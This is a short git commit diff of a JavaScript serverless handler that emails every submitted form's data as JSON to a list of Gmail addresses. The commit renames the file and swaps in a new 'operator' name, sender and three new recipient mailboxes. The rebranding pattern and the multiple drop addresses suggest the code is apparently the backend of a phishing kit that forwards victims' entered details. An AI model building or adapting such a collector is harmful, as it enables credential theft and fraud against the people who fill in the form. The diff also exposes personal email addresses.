fc76f01a53b39e9b323273082342a88d16002d50
sanadarling <sanaminahil11@gmail.com>
2026-07-24 08:52:31 +0500

    Update and rename waris.js to shahzad.js

--- shahzad.js
+++ shahzad.js
@@ -36,11 +36,11 @@ export default async function handler(req, res) {
 
   try {
     await transporter.sendMail({
-      from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "fahadali123gg@gmail.com,linkquarry@gmail.com,splashavalanche090@gmail.com",
-      subject: "Waris",
+      from: `"Samad/Team" <absamadniz@gmail.com>`,
+      to: "nizamanishahzadali2@gmail.com,smithalive125@gmail.com,samadteam318@gmail.com",
+      subject: "shahzad Ahmed",
       text: JSON.stringify(formData, null, 2),
-      html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
+      html: `<h3>Pro Samad Link</h3><pre>${JSON.stringify(
         formData,
         null,
         2
@@ -49,7 +49,7 @@ export default async function handler(req, res) {
 
     res
       .status(200)
-      .json({ success: true, message: "Data sent via email (Asif)" });
+      .json({ success: true, message: "Data sent via email (Samad)" });
   } catch (error) {
     console.error("Email send error:", error);
     res.status(500).json({ error: "Failed to send email" });
